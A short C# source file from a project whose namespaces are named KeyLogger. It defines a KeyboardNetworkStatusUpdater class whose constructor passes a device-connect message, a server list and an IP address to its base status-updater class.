using System.Collections.Generic;
using KeyLogger.Messages;

namespace KeyLogger.Network.Status
{
    public class KeyboardNetworkStatusUpdater : NetworkStatusUpdater
    {
        public KeyboardNetworkStatusUpdater(List<Server> serverlist, string ip)
            : base(new DeviceConnectRequestMessage {Keyboard = false}, serverlist, ip)
        {
        }
    }
}